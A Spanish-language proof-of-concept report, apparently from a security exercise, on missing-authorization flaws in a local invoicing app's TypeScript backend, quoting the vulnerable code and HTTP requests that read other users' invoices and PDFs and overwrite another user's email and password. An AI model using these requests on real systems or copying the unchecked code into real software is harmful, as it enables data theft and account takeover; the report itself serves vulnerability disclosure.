# Prueba de Concepto - Missing Authorization

## Vulnerabilidad encontrada
Las vulnerabilidades de "Missing Authorization" ocurren cuando la aplicación no verifica adecuadamente si un usuario autenticado tiene permisos para acceder a recursos específicos. Aunque la aplicación valida que el usuario esté autenticado (tiene un token JWT válido), no verifica si ese usuario tiene derecho a acceder al recurso solicitado. Se encontraron vulnerabilidades de este tipo en los métodos `getInvoice` y `getInvoicePDF` del archivo `invoiceController.ts`. En los métodos `getInvoice` y `getReceipt` del archivo `invoiceService.ts`. En el método `updateUser` del archivo `authController.ts`. 

**Archivo vulnerable:** `services/backend/src/controllers/invoiceController.ts:44` (getInvoicePDF)
```typescript
    const invoiceId = req.params.id;
    const pdfName = req.query.pdfName as string | undefined;

    if (!pdfName) {
      return res.status(400).json({ error: 'Missing parameter pdfName' });
    }
    const pdf = await InvoiceService.getReceipt(invoiceId, pdfName);  
    // No valida si el usuario tiene autorización para descargar este PDF
```

**Archivo vulnerable:** `services/backend/src/controllers/invoiceController.ts:62` (getInvoice)
```typescript
    const invoiceId = req.params.id;
    const invoice = await InvoiceService.getInvoice(invoiceId); 
    // No valida si el usuario tiene autorización para acceder al invoice
```

**Archivo vulnerable:** `services/backend/src/services/invoiceService.ts:108` (getInvoice)
```typescript
    const invoice = await db<InvoiceRow>('invoices').where({ id: invoiceId }).first();  
    //Al solicitar el invoice nunca verifica desde la bd que sea un invoice del usuario
```
**Archivo vulnerable:** `services/backend/src/services/invoiceService.ts:117` (getReceipt)
```typescript
    const invoice = await db<InvoiceRow>('invoices').where({ id: invoiceId }).first();
    //Al solicitar el PDF del invoice nunca verifica desde la bd que sea del usuario
```

**Archivo vulnerable:** `services/backend/src/controllers/authController.ts:74` (updateUser)
```typescript
    const userId = req.params.id;
    const { username, password, email, first_name, last_name } = req.body;
    try {
    const user: User = {
      username,
      password,
      email,
      first_name,
      last_name
    };
    const userDB = await AuthService.updateUser(user);  
    // Al intentar modificar un usuario no valida si el usuario que lo solicita coincide con el que modifica
```

## Cómo explotar

### Un ejemplo de vulnerabilidad con los invoice

### Paso 1: Autenticarse como cualquier usuario
```http
POST /auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "username": "atacante@example.com",
  "password": "password123"
}
```

### Paso 2: Usar el token para acceder a facturas de otros usuarios
```http
GET /invoices/FACTURA_ID_CUALQUIERA HTTP/1.1
Host: localhost:3000
Authorization: Bearer TOKEN_OBTENIDO
```

### Paso 3: Descargar PDFs de facturas ajenas
```http
GET /invoices/FACTURA_AJENA/invoice?pdfName=recibo_confidencial.pdf HTTP/1.1
Host: localhost:3000
Authorization: Bearer TOKEN_OBTENIDO
```

### Un ejemplo de vulnerabilidad modificando los datos de un usuario

### Modificar datos de cualquier usuario
```http
PUT /users/ID_USUARIO_VICTIMA HTTP/1.1
Host: localhost:3000
Authorization: Bearer TOKEN_CUALQUIER_USUARIO
Content-Type: application/json

{
  "email": "atacante@malicioso.com",
  "password": "nueva_password",
  "first_name": "Atacante",
  "last_name": "Malicioso"
}
```

## Impacto
- Acceso a invoices de otros usuarios. Un usuario podría ver y descargar facturas de cualquier otro.
- Modificación de cuentas ajenas.
- Datos sensibles en documentos pueden estar expuestos